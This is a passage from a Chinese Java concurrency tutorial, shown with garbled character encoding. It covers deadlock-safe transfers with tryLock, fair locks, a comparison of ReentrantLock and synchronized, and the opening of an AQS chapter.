 * å®‰å…¨çš„é“¶è¡Œè½¬è´¦ï¼ˆé¿å…æ­»é”ï¼‰
 */</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SafeBankTransfer</span> {
    
    <span class="hljs-comment">/**
     * å¸¦è¶…æ—¶çš„è½¬è´¦æ“ä½œ
     * é€šè¿‡è¶…æ—¶æœºåˆ¶é¿å…æ­»é”
     */</span>
    <span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">transfer</span><span class="hljs-params">(BankAccount from, BankAccount to, 
                           <span class="hljs-type">double</span> amount, <span class="hljs-type">long</span> timeout, TimeUnit unit)</span> {
        <span class="hljs-type">long</span> <span class="hljs-variable">deadline</span> <span class="hljs-operator">=</span> System.nanoTime() + unit.toNanos(timeout);
        
        <span class="hljs-keyword">while</span> (<span class="hljs-literal">true</span>) {
            <span class="hljs-keyword">if</span> (from.lock.tryLock()) {
                <span class="hljs-keyword">try</span> {
                    <span class="hljs-comment">// è®¡ç®—å‰©ä½™è¶…æ—¶æ—¶é—´</span>
                    <span class="hljs-type">long</span> <span class="hljs-variable">remaining</span> <span class="hljs-operator">=</span> deadline - System.nanoTime();
                    <span class="hljs-keyword">if</span> (remaining &lt;= <span class="hljs-number">0</span>) {
                        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;  <span class="hljs-comment">// è¶…æ—¶</span>
                    }
                    
                    <span class="hljs-comment">// å°è¯•è·å–ç¬¬äºŒæŠŠé”</span>
                    <span class="hljs-keyword">if</span> (to.lock.tryLock(remaining, TimeUnit.NANOSECONDS)) {
                        <span class="hljs-keyword">try</span> {
                            <span class="hljs-comment">// æ£€æŸ¥ä½™é¢</span>
                            <span class="hljs-keyword">if</span> (from.getBalance() &lt; amount) {
                                <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InsufficientFundsException</span>();
                            }
                            <span class="hljs-comment">// æ‰§è¡Œè½¬è´¦</span>
                            from.debit(amount);
                            to.credit(amount);
                            <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;
                        } <span class="hljs-keyword">finally</span> {
                            to.lock.unlock();
                        }
                    }
                } <span class="hljs-keyword">catch</span> (InterruptedException e) {
                    Thread.currentThread().interrupt();
                    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;
                } <span class="hljs-keyword">finally</span> {
                    from.lock.unlock();
                }
            }
            
            <span class="hljs-comment">// è·å–å¤±è´¥ï¼ŒçŸ­æš‚ä¼‘çœ åé‡è¯•</span>
            <span class="hljs-keyword">if</span> (System.nanoTime() &gt;= deadline) {
                <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;  <span class="hljs-comment">// è¶…æ—¶</span>
            }
            
            <span class="hljs-keyword">try</span> {
                Thread.sleep(<span class="hljs-number">10</span>);  <span class="hljs-comment">// é¿å…å¿™ç­‰å¾…</span>
            } <span class="hljs-keyword">catch</span> (InterruptedException e) {
                Thread.currentThread().interrupt();
                <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;
            }
        }
    }
}

<span class="hljs-keyword">class</span> <span class="hljs-title class_">BankAccount</span> {
    <span class="hljs-keyword">final</span> <span class="hljs-type">ReentrantLock</span> <span class="hljs-variable">lock</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ReentrantLock</span>();
    <span class="hljs-keyword">private</span> <span class="hljs-type">double</span> balance;
    
    <span class="hljs-keyword">public</span> <span class="hljs-title function_">BankAccount</span><span class="hljs-params">(<span class="hljs-type">double</span> balance)</span> {
        <span class="hljs-built_in">this</span>.balance = balance;
    }
    
    <span class="hljs-keyword">public</span> <span class="hljs-type">double</span> <span class="hljs-title function_">getBalance</span><span class="hljs-params">()</span> { <span class="hljs-keyword">return</span> balance; }
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">debit</span><span class="hljs-params">(<span class="hljs-type">double</span> amount)</span> { balance -= amount; }
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">credit</span><span class="hljs-params">(<span class="hljs-type">double</span> amount)</span> { balance += amount; }
}

<span class="hljs-keyword">class</span> <span class="hljs-title class_">InsufficientFundsException</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">RuntimeException</span> {
    <span class="hljs-keyword">public</span> <span class="hljs-title function_">InsufficientFundsException</span><span class="hljs-params">()</span> {
        <span class="hljs-built_in">super</span>(<span class="hljs-string">"ä½™é¢ä¸è¶³"</span>);
    }
}
</code></pre>
<h4 data-id="heading-22">4.4 åœºæ™¯å››ï¼šå…¬å¹³é”ä¿è¯é¡ºåº</h4>
<p>åœ¨éœ€è¦ä¸¥æ ¼æŒ‰ç…§è¯·æ±‚é¡ºåºå¤„ç†çš„åœºæ™¯ä¸­ä½¿ç”¨å…¬å¹³é”ã€‚</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">/**
 * å…¬å¹³çš„æ‰“å°é˜Ÿåˆ—
 * ç¡®ä¿æ‰“å°ä»»åŠ¡æŒ‰æäº¤é¡ºåºæ‰§è¡Œ
 */</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">FairPrintQueue</span> {
    
    <span class="hljs-comment">// ä½¿ç”¨å…¬å¹³é”ï¼Œä¿è¯FIFOé¡ºåº</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> <span class="hljs-type">ReentrantLock</span> <span class="hljs-variable">lock</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ReentrantLock</span>(<span class="hljs-literal">true</span>);
    
    <span class="hljs-comment">/**
     * æ‰“å°æ–‡æ¡£
     */</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">printJob</span><span class="hljs-params">(String document)</span> {
        lock.lock();
        <span class="hljs-keyword">try</span> {
            System.out.printf(<span class="hljs-string">"[%s] å¼€å§‹æ‰“å°: %s%n"</span>, 
                Thread.currentThread().getName(), document);
            
            <span class="hljs-comment">// æ¨¡æ‹Ÿæ‰“å°è€—æ—¶</span>
            simulatePrinting();
            
            System.out.printf(<span class="hljs-string">"[%s] å®Œæˆæ‰“å°: %s%n"</span>, 
                Thread.currentThread().getName(), document);
        } <span class="hljs-keyword">finally</span> {
            lock.unlock();
        }
    }
    
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">simulatePrinting</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">try</span> {
            Thread.sleep(<span class="hljs-number">100</span>);
        } <span class="hljs-keyword">catch</span> (InterruptedException e) {
            Thread.currentThread().interrupt();
        }
    }
    
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> {
        <span class="hljs-type">FairPrintQueue</span> <span class="hljs-variable">queue</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FairPrintQueue</span>();
        
        <span class="hljs-comment">// åˆ›å»º10ä¸ªæ‰“å°ä»»åŠ¡</span>
        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">10</span>; i++) {
            <span class="hljs-keyword">final</span> <span class="hljs-type">int</span> <span class="hljs-variable">docNum</span> <span class="hljs-operator">=</span> i;
            <span class="hljs-keyword">new</span> <span class="hljs-title class_">Thread</span>(() -&gt; {
                queue.printJob(<span class="hljs-string">"æ–‡æ¡£-"</span> + docNum);
            }, <span class="hljs-string">"Thread-"</span> + i).start();
        }
    }
}
</code></pre>
<hr/>
<h3 data-id="heading-23">5. ReentrantLock vs synchronized</h3>
<h4 data-id="heading-24">5.1 åŠŸèƒ½å¯¹æ¯”</h4>




























































<table><thead><tr><th align="left">ç‰¹æ€§</th><th align="left">ReentrantLock</th><th align="left">synchronized</th></tr></thead><tbody><tr><td align="left">å®ç°æ–¹å¼</td><td align="left">JDKå®ç°ï¼ˆçº¯Javaï¼‰</td><td align="left">JVMå†…ç½®ï¼ˆnativeï¼‰</td></tr><tr><td align="left">é”è·å–æ–¹å¼</td><td align="left">æ˜¾å¼lock()/unlock()</td><td align="left">éšå¼ï¼Œè¿›å…¥/é€€å‡ºä»£ç å—</td></tr><tr><td align="left">å¯ä¸­æ–­ç­‰å¾…</td><td align="left">âœ… lockInterruptibly()</td><td align="left">âŒ</td></tr><tr><td align="left">è¶…æ—¶è·å–</td><td align="left">âœ… tryLock(timeout)</td><td align="left">âŒ</td></tr><tr><td align="left">éé˜»å¡è·å–</td><td align="left">âœ… tryLock()</td><td align="left">âŒ</td></tr><tr><td align="left">å…¬å¹³é”</td><td align="left">âœ… æ„é€ å‚æ•°å¯é€‰</td><td align="left">âŒ éå…¬å¹³</td></tr><tr><td align="left">æ¡ä»¶å˜é‡</td><td align="left">âœ… å¤šä¸ªCondition</td><td align="left">âŒ å•ä¸€wait/notify</td></tr><tr><td align="left">é”çŠ¶æ€æŸ¥è¯¢</td><td align="left">âœ… isLocked()ç­‰</td><td align="left">âŒ</td></tr><tr><td align="left">è‡ªåŠ¨é‡Šæ”¾</td><td align="left">âŒ å¿…é¡»æ‰‹åŠ¨unlock</td><td align="left">âœ… è‡ªåŠ¨é‡Šæ”¾</td></tr><tr><td align="left">é”ç»‘å®šå¯¹è±¡</td><td align="left">ReentrantLockå®ä¾‹</td><td align="left">ä»»æ„å¯¹è±¡</td></tr></tbody></table>
<h4 data-id="heading-25">5.2 æ€§èƒ½å¯¹æ¯”</h4>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d0097e285acd4a328b65a74995d9ebd2~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6ZWc6Iqx5rC05pyIbGlueWk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765767298&amp;x-signature=25f3M%2FS33CYk3yHe3QEvg5qTrQg%3D" alt="performance-comparison.drawio.png" loading="lazy"/></p>
<ul>
<li><strong>JDK 1.5</strong>: ReentrantLockæ€§èƒ½è¿œä¼˜äºsynchronized</li>
<li><strong>JDK 1.6+</strong>: synchronizedç»è¿‡ä¼˜åŒ–ï¼ˆåå‘é”ã€è½»é‡çº§é”ï¼‰ï¼Œæ€§èƒ½å·®è·ç¼©å°</li>
<li><strong>ä½ç«äº‰åœºæ™¯</strong>: synchronizedç•¥ä¼˜ï¼ˆå°‘äº†lockå¯¹è±¡çš„å¼€é”€ï¼‰</li>
<li><strong>é«˜ç«äº‰åœºæ™¯</strong>: ReentrantLockæ›´å¯æ§ï¼ˆå¯é€‰å…¬å¹³é”ã€å¯ä¸­æ–­ï¼‰</li>
</ul>
<h4 data-id="heading-26">5.3 ä»£ç å¯¹æ¯”</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">/**
 * synchronized vs ReentrantLock ä»£ç å¯¹æ¯”
 */</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">LockComparison</span> {
    
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> <span class="hljs-type">Object</span> <span class="hljs-variable">syncLock</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>();
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> <span class="hljs-type">ReentrantLock</span> <span class="hljs-variable">reentrantLock</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ReentrantLock</span>();
    
    <span class="hljs-comment">// ========== åŸºæœ¬ç”¨æ³•å¯¹æ¯” ==========</span>
    
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">synchronizedMethod</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">synchronized</span> (syncLock) {
            <span class="hljs-comment">// ä¸´ç•ŒåŒº</span>
        }
    }
    
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">reentrantLockMethod</span><span class="hljs-params">()</span> {
        reentrantLock.lock();
        <span class="hljs-keyword">try</span> {
            <span class="hljs-comment">// ä¸´ç•ŒåŒº</span>
        } <span class="hljs-keyword">finally</span> {
            reentrantLock.unlock();
        }
    }
    
    <span class="hljs-comment">// ========== ç­‰å¾…/é€šçŸ¥å¯¹æ¯” ==========</span>
    
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">synchronizedWait</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> InterruptedException {
        <span class="hljs-keyword">synchronized</span> (syncLock) {
            syncLock.wait();     <span class="hljs-comment">// ç­‰å¾…</span>
            syncLock.notify();   <span class="hljs-comment">// é€šçŸ¥å•ä¸ª</span>
            syncLock.notifyAll();<span class="hljs-comment">// é€šçŸ¥æ‰€æœ‰</span>
        }
    }
    
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> <span class="hljs-type">Condition</span> <span class="hljs-variable">condition</span> <span class="hljs-operator">=</span> reentrantLock.newCondition();
    
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">reentrantLockWait</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> InterruptedException {
        reentrantLock.lock();
        <span class="hljs-keyword">try</span> {
            condition.await();     <span class="hljs-comment">// ç­‰å¾…</span>
            condition.signal();    <span class="hljs-comment">// é€šçŸ¥å•ä¸ª</span>
            condition.signalAll(); <span class="hljs-comment">// é€šçŸ¥æ‰€æœ‰</span>
        } <span class="hljs-keyword">finally</span> {
            reentrantLock.unlock();
        }
    }
}
</code></pre>
<h4 data-id="heading-27">5.4 é€‰æ‹©å»ºè®®</h4>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/73b7f9218a5849e090342bd230668e57~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6ZWc6Iqx5rC05pyIbGlueWk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765767298&amp;x-signature=Pwv2%2F9okDmXAXdFCoRkUmi7nHUs%3D" alt="lock-selection.drawio.png" loading="lazy"/></p>
<p><strong>é€‰æ‹©synchronizedçš„æƒ…å†µ</strong>ï¼š</p>
<ul>
<li>ç®€å•åŒæ­¥éœ€æ±‚</li>
<li>ä¸éœ€è¦é«˜çº§ç‰¹æ€§</li>
<li>è¿½æ±‚ä»£ç ç®€æ´</li>
<li>å›¢é˜Ÿå¯¹ReentrantLockä¸ç†Ÿæ‚‰</li>
</ul>
<p><strong>é€‰æ‹©ReentrantLockçš„æƒ…å†µ</strong>ï¼š</p>
<ul>
<li>éœ€è¦å¯ä¸­æ–­ç­‰å¾…</li>
<li>éœ€è¦è¶…æ—¶è·å–</li>
<li>éœ€è¦å…¬å¹³é”</li>
<li>éœ€è¦å¤šä¸ªæ¡ä»¶å˜é‡</li>
<li>éœ€è¦æŸ¥è¯¢é”çŠ¶æ€</li>
<li>éœ€è¦æ›´ç»†ç²’åº¦çš„é”æ§åˆ¶</li>
</ul>
<h4 data-id="heading-28">5.5 å¼‚å¸¸å¤„ç†çš„å…³é”®åŒºåˆ«</h4>
<p>é¢è¯•ä¸­å¸¸è¢«å¿½ç•¥ä½†éå¸¸é‡è¦çš„åŒºåˆ«ï¼š</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">/**
 * å¼‚å¸¸å¤„ç†å¯¹æ¯” - è¿™æ˜¯synchronizedçš„é‡è¦ä¼˜åŠ¿
 */</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ExceptionHandlingComparison</span> {
    
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> <span class="hljs-type">Object</span> <span class="hljs-variable">syncLock</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>();
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> <span class="hljs-type">ReentrantLock</span> <span class="hljs-variable">reentrantLock</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ReentrantLock</span>();
    
    <span class="hljs-comment">/**
     * synchronizedï¼šå¼‚å¸¸æ—¶è‡ªåŠ¨é‡Šæ”¾é”
     * æ— è®ºæ˜¯æ­£å¸¸é€€å‡ºè¿˜æ˜¯å¼‚å¸¸é€€å‡ºï¼Œé”éƒ½ä¼šè¢«è‡ªåŠ¨é‡Šæ”¾
     */</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">synchronizedWithException</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">synchronized</span> (syncLock) {
            <span class="hljs-comment">// å³ä½¿è¿™é‡ŒæŠ›å‡ºå¼‚å¸¸ï¼Œé”ä¹Ÿä¼šè‡ªåŠ¨é‡Šæ”¾</span>
            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(<span class="hljs-string">"å‡ºé”™äº†"</span>);
        }
        <span class="hljs-comment">// é”å·²è‡ªåŠ¨é‡Šæ”¾ï¼Œå…¶ä»–çº¿ç¨‹å¯ä»¥è·å–</span>
    }
    
    <span class="hljs-comment">/**
     * ReentrantLockï¼šå¿…é¡»åœ¨finallyä¸­é‡Šæ”¾é”
     * å¦‚æœå¿˜è®°finallyæˆ–unlockï¼Œé”å°†æ°¸è¿œä¸ä¼šé‡Šæ”¾ï¼
     */</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">reentrantLockWithException</span><span class="hljs-params">()</span> {
        reentrantLock.lock();
        <span class="hljs-keyword">try</span> {
            <span class="hljs-comment">// å¦‚æœè¿™é‡ŒæŠ›å‡ºå¼‚å¸¸...</span>
            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(<span class="hljs-string">"å‡ºé”™äº†"</span>);
        } <span class="hljs-keyword">finally</span> {
            <span class="hljs-comment">// å¿…é¡»åœ¨finallyä¸­é‡Šæ”¾ï¼</span>
            reentrantLock.unlock();
        }
    }
    
    <span class="hljs-comment">/**
     * ã€å±é™©ã€‘é”™è¯¯ç¤ºèŒƒï¼šå¿˜è®°finally
     */</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">dangerousCode</span><span class="hljs-params">()</span> {
        reentrantLock.lock();
        <span class="hljs-comment">// å¦‚æœä¸‹é¢ä»£ç æŠ›å‡ºå¼‚å¸¸ï¼Œé”å°†æ°¸è¿œä¸ä¼šé‡Šæ”¾ï¼</span>
        doSomethingDangerous();
        reentrantLock.unlock(); <span class="hljs-comment">// è¿™è¡Œå¯èƒ½æ°¸è¿œä¸ä¼šæ‰§è¡Œ</span>
    }
    
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doSomethingDangerous</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>();
    }
}
</code></pre>
<p><strong>æ ¸å¿ƒåŒºåˆ«</strong>ï¼š</p>
<ul>
<li><code>synchronized</code>ï¼šJVMä¿è¯é”çš„é‡Šæ”¾ï¼Œå¼€å‘è€…æ— éœ€å…³å¿ƒ</li>
<li><code>ReentrantLock</code>ï¼šå¼€å‘è€…å…¨æƒè´Ÿè´£ï¼Œå¿…é¡»é…åˆtry-finallyä½¿ç”¨</li>
</ul>
<h4 data-id="heading-29">5.6 ä¸ºä»€ä¹ˆæœ‰æ—¶synchronizedæ›´å¥½</h4>
<p>è™½ç„¶ReentrantLockåŠŸèƒ½æ›´å¼ºå¤§ï¼Œä½†ä»¥ä¸‹åœºæ™¯synchronizedæ˜¯æ›´å¥½çš„é€‰æ‹©ï¼š</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">/**
 * synchronizedæ›´é€‚åˆçš„åœºæ™¯
 */</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">WhenToUseSynchronized</span> {
    
    <span class="hljs-comment">/**
     * åœºæ™¯1ï¼šç®€å•çš„åŒæ­¥æ–¹æ³•
     * synchronizedæ›´ç®€æ´ï¼Œä¸éœ€è¦try-finally
     */</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">synchronized</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">simpleMethod</span><span class="hljs-params">()</span> {
        <span class="hljs-comment">// ä¸€è¡Œæå®šï¼Œç®€æ´æ˜äº†</span>
    }
    
    <span class="hljs-comment">/**
     * åœºæ™¯2ï¼šåŒæ­¥ä»£ç å—å¾ˆçŸ­
     * JVMå¯¹synchronizedæœ‰åå‘é”ã€è½»é‡çº§é”ä¼˜åŒ–
     */</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">shortCriticalSection</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">synchronized</span> (<span class="hljs-built_in">this</span>) {
            counter++;  <span class="hljs-comment">// å°±è¿™ä¸€è¡Œï¼Œç”¨synchronizedè¶³å¤Ÿ</span>
        }
    }
    
    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> counter;
    
    <span class="hljs-comment">/**
     * åœºæ™¯3ï¼šä¸éœ€è¦ReentrantLockçš„é«˜çº§ç‰¹æ€§
     * å¦‚æœä¸éœ€è¦ä¸­æ–­ã€è¶…æ—¶ã€å…¬å¹³é”ã€å¤šæ¡ä»¶å˜é‡
     * ç”¨synchronizedæ›´å®‰å…¨ï¼ˆä¸ä¼šå¿˜è®°é‡Šæ”¾é”ï¼‰
     */</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">synchronized</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">noAdvancedFeatures</span><span class="hljs-params">()</span> {
        <span class="hljs-comment">// æ™®é€šä¸šåŠ¡é€»è¾‘</span>
    }
    
    <span class="hljs-comment">/**
     * åœºæ™¯4ï¼šé”çš„ç²’åº¦å°±æ˜¯æ•´ä¸ªæ–¹æ³•
     * synchronizedæ–¹æ³•å¤©ç„¶é€‚åˆ
     */</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">synchronized</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">entireMethodNeedLock</span><span class="hljs-params">()</span> {
        step1();
        step2();
        step3();
    }
    
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">step1</span><span class="hljs-params">()</span> {}
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">step2</span><span class="hljs-params">()</span> {}
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">step3</span><span class="hljs-params">()</span> {}
}
</code></pre>
<p><strong>æ€»ç»“</strong>ï¼š</p>








































<table><thead><tr><th align="left">åœºæ™¯</th><th align="left">æ¨è</th><th align="left">åŸå› </th></tr></thead><tbody><tr><td align="left">ç®€å•åŒæ­¥</td><td align="left">synchronized</td><td align="left">è¯­æ³•ç®€æ´ï¼Œä¸æ˜“å‡ºé”™</td></tr><tr><td align="left">éœ€è¦ä¸­æ–­/è¶…æ—¶</td><td align="left">ReentrantLock</td><td align="left">synchronizedä¸æ”¯æŒ</td></tr><tr><td align="left">éœ€è¦å…¬å¹³é”</td><td align="left">ReentrantLock</td><td align="left">synchronizedåªæœ‰éå…¬å¹³</td></tr><tr><td align="left">å¤šä¸ªç­‰å¾…æ¡ä»¶</td><td align="left">ReentrantLock</td><td align="left">synchronizedåªæœ‰ä¸€ä¸ªwait set</td></tr><tr><td align="left">æ€§èƒ½æ•æ„Ÿ+ä½ç«äº‰</td><td align="left">synchronized</td><td align="left">JVMä¼˜åŒ–æ›´å¥½</td></tr><tr><td align="left">é—ç•™ä»£ç ç»´æŠ¤</td><td align="left">synchronized</td><td align="left">ä¿æŒä¸€è‡´æ€§</td></tr></tbody></table>
<h4 data-id="heading-30">5.7 é”çš„ä¼˜ç¼ºç‚¹æ€»ç»“</h4>
<p>åœ¨é€‰æ‹©åŒæ­¥æœºåˆ¶ä¹‹å‰ï¼Œå…ˆç†è§£é”æœ¬èº«çš„ä¼˜ç¼ºç‚¹ï¼š</p>
<p><strong>é”çš„ä¼˜ç‚¹</strong>ï¼š</p>
<ol>
<li><strong>ç®€å•ç›´è§‚</strong>ï¼šæ¯”æ— é”ç¼–ç¨‹å®¹æ˜“ç†è§£å’Œå®ç°</li>
<li><strong>åŠŸèƒ½å®Œæ•´</strong>ï¼šæ”¯æŒå¤æ‚çš„åŒæ­¥é€»è¾‘</li>
<li><strong>å¯ç»„åˆæ€§</strong>ï¼šå¤šä¸ªæ“ä½œå¯ä»¥åŸå­åŒ–æ‰§è¡Œ</li>
</ol>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// é”å¯ä»¥ä¿æŠ¤å¤æ‚çš„å¤åˆæ“ä½œ</span>
lock.lock();
<span class="hljs-keyword">try</span> {
    <span class="hljs-keyword">if</span> (map.containsKey(key)) {
        map.put(key, map.get(key) + <span class="hljs-number">1</span>);
    } <span class="hljs-keyword">else</span> {
        map.put(key, <span class="hljs-number">1</span>);
    }
} <span class="hljs-keyword">finally</span> {
    lock.unlock();
}
</code></pre>
<p><strong>é”çš„ç¼ºç‚¹</strong>ï¼š</p>
<ol>
<li><strong>æ€§èƒ½å¼€é”€</strong>ï¼šçº¿ç¨‹é˜»å¡/å”¤é†’æ¶‰åŠç³»ç»Ÿè°ƒç”¨å’Œä¸Šä¸‹æ–‡åˆ‡æ¢</li>
<li><strong>æ­»é”é£é™©</strong>ï¼šå¤šæŠŠé”å¯èƒ½é€ æˆæ­»é”</li>
<li><strong>ä¼˜å…ˆçº§åè½¬</strong>ï¼šä½ä¼˜å…ˆçº§çº¿ç¨‹æŒæœ‰é”æ—¶ï¼Œé«˜ä¼˜å…ˆçº§çº¿ç¨‹è¢«è¿«ç­‰å¾…</li>
<li><strong>ä¸å¯ç»„åˆ</strong>ï¼šä¸¤ä¸ªçº¿ç¨‹å®‰å…¨çš„æ“ä½œç»„åˆåå¯èƒ½ä¸å®‰å…¨</li>
</ol>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// ä¸å¯ç»„åˆçš„ä¾‹å­ï¼šä¸¤ä¸ªçº¿ç¨‹å®‰å…¨æ“ä½œç»„åˆåä¸å®‰å…¨</span>
<span class="hljs-comment">// å‡è®¾listæ˜¯CopyOnWriteArrayListï¼ˆçº¿ç¨‹å®‰å…¨ï¼‰</span>
<span class="hljs-keyword">if</span> (!list.contains(item)) {  <span class="hljs-comment">// æ“ä½œ1ï¼šçº¿ç¨‹å®‰å…¨</span>
    list.add(item);           <span class="hljs-comment">// æ“ä½œ2ï¼šçº¿ç¨‹å®‰å…¨</span>
}
<span class="hljs-comment">// ä½†æ•´ä¸ªif-then-addä¸æ˜¯åŸå­çš„ï¼éœ€è¦é¢å¤–çš„é”</span>
</code></pre>
<p><strong>ä½•æ—¶è€ƒè™‘å…¶ä»–æ–¹æ¡ˆ</strong>ï¼š</p>



































<table><thead><tr><th align="left">åœºæ™¯</th><th align="left">æ¨èæ–¹æ¡ˆ</th><th align="left">åŸå› </th></tr></thead><tbody><tr><td align="left">ç®€å•è®¡æ•°</td><td align="left">AtomicInteger</td><td align="left">æ— é”ï¼Œæ€§èƒ½æ›´å¥½</td></tr><tr><td align="left">ç®€å•æ ‡å¿—ä½</td><td align="left">volatile</td><td align="left">è¶³å¤Ÿä¿è¯å¯è§æ€§</td></tr><tr><td align="left">è¯»å¤šå†™å°‘</td><td align="left">ReadWriteLock/StampedLock</td><td align="left">è¯»æ“ä½œå¹¶å‘</td></tr><tr><td align="left">ç´¯åŠ ç»Ÿè®¡</td><td align="left">LongAdder</td><td align="left">é«˜ç«äº‰ä¸‹æ€§èƒ½æ›´å¥½</td></tr><tr><td align="left">å•æ¬¡åˆå§‹åŒ–</td><td align="left">DCLæˆ–Holderæ¨¡å¼</td><td align="left">é¿å…æ¯æ¬¡åŠ é”</td></tr></tbody></table>
<h2 data-id="heading-31">ç¬¬äºŒç« ï¼šAQS æ ¸å¿ƒåŸç†å‰–æ</h2>
<h3 data-id="heading-32">1. AQSè®¾è®¡æ€æƒ³</h3>
<h4 data-id="heading-33">1.1 ä»€ä¹ˆæ˜¯AQS</h4>
<p>AQSï¼ˆAbstractQueuedSynchronizerï¼‰æ˜¯Doug Leaè®¾è®¡çš„ä¸€ä¸ªç”¨äºæ„å»ºé”å’ŒåŒæ­¥å™¨çš„æ¡†æ¶ã€‚JUCï¼ˆjava.util.concurrentï¼‰åŒ…ä¸­çš„å¤§éƒ¨åˆ†åŒæ­¥å™¨éƒ½æ˜¯åŸºäºAQSå®ç°çš„ï¼š</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/8c33376a11c44aa99ca78d7fa9ec5fe0~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6ZWc6Iqx5rC05pyIbGlueWk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765767298&amp;x-signature=Dqvb6XDMs1vePNniLuvHXFZYnUM%3D" alt="aqs-overview.drawio.png" loading="lazy"/>
